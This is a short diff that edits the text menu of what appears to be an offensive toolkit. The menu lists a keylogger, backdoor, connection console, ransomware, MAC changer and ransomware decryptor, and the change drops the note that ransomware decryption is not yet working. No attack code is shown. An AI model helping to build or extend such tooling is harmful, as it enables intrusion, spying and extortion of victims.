@@ -18,7 +18,7 @@ a = """
 6-)Keyloger from ip
 7-)Backdoor
 8-)connection console
-9-)Ransomware  !!!(not decrypted for now)!!!
+9-)Ransomware
 10-)Changemac
 11-)Keylogger Listener
 12-)Ransomware Decrypt
